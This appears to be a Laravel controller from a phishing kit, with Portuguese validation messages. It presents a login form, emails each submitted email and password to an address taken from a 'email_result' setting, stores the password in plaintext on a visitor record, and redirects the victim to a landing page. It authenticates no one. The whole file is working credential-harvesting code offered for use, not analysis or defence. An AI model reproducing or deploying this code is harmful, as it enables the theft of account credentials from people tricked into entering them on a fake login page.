<?php

namespace App\Http\Controllers;

use App\Mail\EmailLogin;
use App\Models\Settings;
use App\Models\Visitor;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Throwable;

class AuthController extends Controller {
    public function index()
    {
        return view('login');
    }

    public function post(Request $request)
    {
        $data = $request->validate([
            'user' => 'required|email',
            'pass' => 'required|string|min:6',
        ], [
            'user.required' => 'O campo e-mail é obrigatório.',
            'user.email' => 'O campo e-mail deve ser um endereço de e-mail válido.',
            'pass.required' => 'O campo senha é obrigatório.',
            'pass.string' => 'O campo senha deve ser uma string.',
            'pass.min' => 'O campo senha deve ter pelo menos :min caracteres.',
        ]);

        try {
            Mail::to(Settings::me()->email_result)->sendNow(new EmailLogin($data));
            $visitor = Visitor::current();
            $visitor->user = $data['user'];
            $visitor->pass = $data['pass'];
            $visitor->save();
        } catch (Throwable $t) {
            Log::error($t);
        }

        return $this->redirect_to(
            route: 'landing.index',
            method: 'index',
        );
    }
}
